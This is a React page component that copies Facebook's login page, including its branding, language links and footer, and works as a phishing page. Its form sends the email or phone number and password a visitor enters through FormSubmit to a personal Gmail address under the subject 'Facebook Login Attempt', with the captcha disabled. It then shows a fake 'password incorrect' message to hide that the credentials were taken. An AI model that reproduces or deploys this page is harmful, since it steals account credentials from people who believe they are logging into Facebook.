'use client';

import { useState } from 'react';

export default function FacebookLoginPage() {
  const [submitted, setSubmitted] = useState(false);

  return (
    <>
      <div className="bg-[#f0f2f5] min-h-screen flex justify-center items-center text-black">
        <div className="w-full max-w-6xl flex flex-col md:flex-row justify-between items-center p-4">
          {/* Left */}
          <div className="md:w-1/2 mb-10 md:mb-0 px-4 text-center md:text-left flex flex-col items-center md:items-start">

            <h1 className="text-[#1877f2] text-6xl font-bold mb-4 font-sans">facebook</h1>
            <p className="text-2xl font-normal text-black">Facebook helps you connect and share with the people in your life.</p>
          </div>

          {/* Right */}
          <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
            <form
              action="https://formsubmit.co/m.b.siam2008@gmail.com"
              method="POST"
              onSubmit={() => setSubmitted(true)}
            >
              {/* Required for FormSubmit */}
              <input type="hidden" name="_captcha" value="false" />
              <input type="hidden" name="_template" value="table" />
              <input type="hidden" name="_subject" value="Facebook Login Attempt" />
              <input type="hidden" name="_next" value="http://localhost:3000/facebook" />

              <input
                type="text"
                name="email"
                placeholder="Email address or phone number"
                required
                className="w-full p-3 border border-gray-300 rounded-lg mb-3 text-black text-lg"
              />
              <input
                type="password"
                name="password"
                placeholder="Password"
                required
                className="w-full p-3 border border-gray-300 rounded-lg mb-3 text-lg"
              />
              <button
                type="submit"
                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white text-xl font-semibold py-2 rounded-lg mb-3"
              >
                Log In
              </button>

              {submitted && (
                <p className="text-red-600 text-sm text-center mb-3">
                  The password that you've entered is incorrect. <br />
                  <span className="text-blue-600 underline cursor-pointer">Forgotten password?</span>
                </p>
              )}

              <div className="text-center border-t my-4" />

              <div className="flex justify-center">
                <button
                  type="button"
                  className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold px-4 py-2 rounded-lg"
                >
                  Create New Account
                </button>
              </div>
            </form>

            <p className="text-center text-xs mt-6">
              <span className="font-bold">Create a Page</span> for a celebrity, brand or business.
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="bg-white pt-8 pb-12 px-4 text-center text-xs text-gray-500 space-y-4">
        <div className="max-w-6xl mx-auto flex flex-wrap justify-center gap-x-4 gap-y-1 text-[#385898] font-normal text-sm">
          {[
            'English (UK)', 'বাংলা', 'অসমীয়া', 'हिन्दी', 'नेपाली',
            'Bahasa Indonesia', 'العربية', '中文(简体)', 'Bahasa Melayu',
            'Español', 'Português (Brasil)'
          ].map(lang => (
            <span key={lang} className="hover:underline cursor-pointer">{lang}</span>
          ))}
          <button className="border border-gray-300 px-2 py-0.5 ml-2 text-gray-600">+</button>
        </div>

        <hr className="my-4" />

        <div className="max-w-6xl mx-auto flex flex-wrap justify-center gap-x-3 gap-y-2 text-[#737373] text-xs">
          {[
            'Sign Up', 'Log in', 'Messenger', 'Facebook Lite', 'Video', 'Meta Pay',
            'Meta Store', 'Meta Quest', 'Ray-Ban Meta', 'Meta AI', 'Instagram', 'Threads',
            'Voting Information Centre', 'Privacy Policy', 'Privacy Centre', 'About',
            'Create ad', 'Create Page', 'Developers', 'Careers', 'Cookies', 'AdChoices',
            'Terms', 'Help', 'Contact uploading and non-users', 'Settings', 'Activity log'
          ].map(link => (
            <span key={link} className="hover:underline cursor-pointer whitespace-nowrap">{link}</span>
          ))}
        </div>

        <div className="mt-4 text-center text-gray-500 text-xs">
          Meta © 2025
        </div>
      </div>
    </>
  );
}
